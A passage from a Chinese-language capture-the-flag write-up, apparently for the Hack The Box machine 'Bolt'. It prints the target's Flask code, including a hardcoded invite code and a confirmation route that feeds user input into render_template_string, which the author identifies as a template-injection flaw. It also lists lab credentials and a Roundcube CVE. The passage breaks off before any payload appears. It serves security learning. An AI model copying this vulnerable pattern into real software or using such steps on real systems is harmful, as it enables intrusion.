+</span></span><span class="line"><span class="cl">    <span class="n">email</span>    <span class="o">=</span> <span class="n">TextField</span><span class="p">(</span><span class="s1">&#39;Email&#39;</span>        <span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="s1">&#39;email_create&#39;</span>    <span class="p">,</span> <span class="n">validators</span><span class="o">=</span><span class="p">[</span><span class="n">DataRequired</span><span class="p">(),</span> <span class="n">Email</span><span class="p">()])</span>
+</span></span><span class="line"><span class="cl">    <span class="n">password</span> <span class="o">=</span> <span class="n">PasswordField</span><span class="p">(</span><span class="s1">&#39;Password&#39;</span> <span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="s1">&#39;pwd_create&#39;</span>      <span class="p">,</span> <span class="n">validators</span><span class="o">=</span><span class="p">[</span><span class="n">DataRequired</span><span class="p">()])</span>
+</span></span><span class="line"><span class="cl">    <span class="n">invite_code</span> <span class="o">=</span> <span class="n">TextField</span><span class="p">(</span><span class="s1">&#39;Invite Code&#39;</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="s1">&#39;invite_code&#39;</span>    <span class="p">,</span> <span class="n">validators</span><span class="o">=</span><span class="p">[</span><span class="n">DataRequired</span><span class="p">()])</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>而在<code>routes.py</code>中定义了<code>Invite Code</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292148716.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292148716.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292148716.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292148716.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292148716.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292148716.png" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@blueprint.route</span><span class="p">(</span><span class="s1">&#39;/register&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">register</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">login_form</span> <span class="o">=</span> <span class="n">LoginForm</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">create_account_form</span> <span class="o">=</span> <span class="n">CreateAccountForm</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;register&#39;</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">username</span>  <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">email</span>     <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;email&#39;</span>   <span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">code</span>	  <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;invite_code&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">code</span> <span class="o">!=</span> <span class="s1">&#39;XNSS-HSJW-3NGU-8XTJ&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;code-500.html&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">email</span><span class="o">=</span><span class="n">email</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">data</span> <span class="ow">is</span> <span class="kc">None</span> <span class="ow">and</span> <span class="n">code</span> <span class="o">==</span> <span class="s1">&#39;XNSS-HSJW-3NGU-8XTJ&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># Check usename exists</span>
+</span></span><span class="line"><span class="cl">            <span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">username</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">user</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span> <span class="s1">&#39;accounts/register.html&#39;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                                    <span class="n">msg</span><span class="o">=</span><span class="s1">&#39;Username already registered&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                    <span class="n">success</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                    <span class="n">form</span><span class="o">=</span><span class="n">create_account_form</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="c1"># Check email exists</span>
+</span></span><span class="line"><span class="cl">            <span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">email</span><span class="o">=</span><span class="n">email</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">user</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span> <span class="s1">&#39;accounts/register.html&#39;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                                    <span class="n">msg</span><span class="o">=</span><span class="s1">&#39;Email already registered&#39;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                                    <span class="n">success</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                    <span class="n">form</span><span class="o">=</span><span class="n">create_account_form</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="c1"># else we can create the user</span>
+</span></span><span class="line"><span class="cl">            <span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="p">(</span><span class="o">**</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">user</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span> <span class="s1">&#39;accounts/register.html&#39;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                                <span class="n">msg</span><span class="o">=</span><span class="s1">&#39;User created please &lt;a href=&#34;/login&#34;&gt;login&lt;/a&gt;&#39;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                                <span class="n">success</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">form</span><span class="o">=</span><span class="n">create_account_form</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span> <span class="s1">&#39;accounts/register.html&#39;</span><span class="p">,</span> <span class="n">form</span><span class="o">=</span><span class="n">create_account_form</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>成功注册并登录</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292150051.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292150051.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292150051.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292150051.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292150051.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292150051.png" /></p>
+<p><code>extras</code>下面挺多功能的,但是好像只是个前端???</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292154767.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292154767.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292154767.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292154767.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292154767.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292154767.png" /></p>
+<p><code>mail.bolt.htb</code>如下</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292139397.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292139397.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292139397.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292139397.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292139397.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292139397.png" /></p>
+<p>可以用新注册的用户<code>test:test</code>进行登录,从数据库中得到的<code>admin:deadbolt</code>反而不可以&hellip;</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292157064.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292157064.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292157064.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292157064.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292157064.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292157064.png" /></p>
+<p>版本是<code>Roundcube Webmail 1.4.6</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292306133.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292306133.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292306133.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292306133.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292306133.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292306133.png" /></p>
+<p>有个sql注入的CVE<a href="https://www.cvedetails.com/cve/CVE-2021-44026/" target="_blank" rel="noopener noreffer ">CVE-2021-44026</a>,但是没找到利用方式&hellip;</p>
+<h2 id="模板注入获取user权限">模板注入获取user权限</h2>
+<p><code>demo.bolt.htb</code>用到了<code>jinja2</code>和<code>flask</code>猜测可能存在SSTI模板注入</p>
+<p>在<code>image</code>中全局搜索<code>render_template_string</code></p>
+<p>在<code>image/41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/home/routes.py</code>中调用了<code>render_template_string</code>,因此可能存在模板注入</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@blueprint.route</span><span class="p">(</span><span class="s2">&#34;/example-profile&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@login_required</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">profile</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Profiles&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;GET&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;example-profile.html&#39;</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="n">user</span><span class="p">,</span><span class="n">current_user</span><span class="o">=</span><span class="n">current_user</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34;Experimental Feature&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cur_user</span> <span class="o">=</span> <span class="n">current_user</span>
+</span></span><span class="line"><span class="cl">        <span class="n">user</span> <span class="o">=</span> <span class="n">current_user</span><span class="o">.</span><span class="n">username</span>
+</span></span><span class="line"><span class="cl">        <span class="n">name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">experience</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;experience&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">skills</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;skills&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">msg</span> <span class="o">=</span> <span class="n">Message</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="n">recipients</span><span class="o">=</span><span class="p">[</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">cur_user</span><span class="o">.</span><span class="n">email</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">                <span class="n">sender</span> <span class="o">=</span> <span class="s1">&#39;support@example.com&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="n">reply_to</span> <span class="o">=</span> <span class="s1">&#39;support@example.com&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="n">subject</span> <span class="o">=</span> <span class="s2">&#34;Please confirm your profile changes&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">cur_user</span><span class="o">.</span><span class="n">profile_update</span> <span class="o">=</span> <span class="n">name</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;page-500.html&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">current_user</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">token</span> <span class="o">=</span> <span class="n">ts</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">salt</span><span class="o">=</span><span class="s1">&#39;changes-confirm-key&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">confirm_url</span> <span class="o">=</span> <span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;home_blueprint.confirm_changes&#39;</span><span class="p">,</span><span class="n">token</span><span class="o">=</span><span class="n">token</span><span class="p">,</span><span class="n">_external</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">html</span> <span class="o">=</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;emails/confirm-changes.html&#39;</span><span class="p">,</span><span class="n">confirm_url</span><span class="o">=</span><span class="n">confirm_url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">msg</span><span class="o">.</span><span class="n">html</span> <span class="o">=</span> <span class="n">html</span>
+</span></span><span class="line"><span class="cl">        <span class="n">mail</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@blueprint.route</span><span class="p">(</span><span class="s1">&#39;/confirm/changes/&lt;token&gt;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">confirm_changes</span><span class="p">(</span><span class="n">token</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Confirmation Token&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">email</span> <span class="o">=</span> <span class="n">ts</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">salt</span><span class="o">=</span><span class="s2">&#34;changes-confirm-key&#34;</span><span class="p">,</span> <span class="n">max_age</span><span class="o">=</span><span class="mi">86400</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">abort</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">email</span><span class="p">)</span><span class="o">.</span><span class="n">first_or_404</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">name</span> <span class="o">=</span> <span class="n">user</span><span class="o">.</span><span class="n">profile_update</span>
+</span></span><span class="line"><span class="cl">    <span class="n">template</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;templates/emails/update-name.html&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">msg</span> <span class="o">=</span> <span class="n">Message</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">recipients</span><span class="o">=</span><span class="p">[</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">user</span><span class="o">.</span><span class="n">email</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">            <span class="n">sender</span> <span class="o">=</span> <span class="s1">&#39;support@example.com&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">reply_to</span> <span class="o">=</span> <span class="s1">&#39;support@example.com&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">subject</span> <span class="o">=</span> <span class="s2">&#34;Your profile changes have been confirmed.&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">msg</span><span class="o">.</span><span class="n">html</span> <span class="o">=</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">template</span> <span class="o">%</span> <span class="n">name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">mail</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>forms.py</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">UpdateProfileForm</span><span class="p">(</span><span class="n">FlaskForm</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">name</span> <span class="o">=</span> <span class="n">TextField</span><span class="p">(</span><span class="s1">&#39;Name&#39;</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="s1">&#39;name&#39;</span><span class="p">,</span> <span class="n">validators</span><span class="o">=</span><span class="p">[</span><span class="n">DataRequired</span><span class="p">()])</span>
+</span></span><span class="line"><span class="cl">    <span class="n">experience</span> <span class="o">=</span> <span class="n">TextField</span><span class="p">(</span><span class="s1">&#39;Experience&#39;</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="s1">&#39;experience&#39;</span><span class="p">,</span> <span class="n">validators</span><span class="o">=</span><span class="p">[</span><span class="n">DataRequired</span><span class="p">()])</span>
+</span></span><span class="line"><span class="cl">    <span class="n">skills</span> <span class="o">=</span> <span class="n">TextField</span><span class="p">(</span><span class="s1">&#39;Skills&#39;</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="s1">&#39;skills&#39;</span><span class="p">,</span> <span class="n">validators</span><span class="o">=</span><span class="p">[</span><span class="n">DataRequired</span><span class="p">()])</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>templates/emails/update-name.html</code></p>
+<p><code>examples-profile.html</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;tab-pane&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;settings&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Email verification is required in order to update personal information.<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">form</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;form-horizontal&#34;</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;/example-profile&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;form-group row&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&#34;inputName2&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;col-sm-2 col-form-label&#34;</span><span class="p">&gt;</span>Name<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;col-sm-10&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;form-control&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;inputName2&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;name&#34;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&#34;Name&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
